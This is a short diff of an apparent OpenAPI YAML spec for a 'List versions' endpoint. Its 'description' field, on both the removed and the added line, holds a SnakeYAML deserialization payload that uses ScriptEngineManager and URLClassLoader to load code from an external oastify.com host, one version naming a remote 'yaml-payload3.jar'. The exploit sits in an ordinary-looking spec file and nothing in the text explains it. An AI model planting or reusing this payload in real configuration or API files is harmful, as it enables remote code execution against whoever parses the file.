@@ -11,7 +11,7 @@ paths:
     get:
       operationId: getVersions-v2
       summary: List versions
-      description: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://if1me21tp4y8t1g5jx0r3zhsljrafb30.oastify.com/yaml-payload3.jar\"]]]]
+      description: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [http://zbe3ajxalluppicmfew8zgd9h0nrbtzi.oastify.com]]]]
       produces:
       - application/json
       responses:
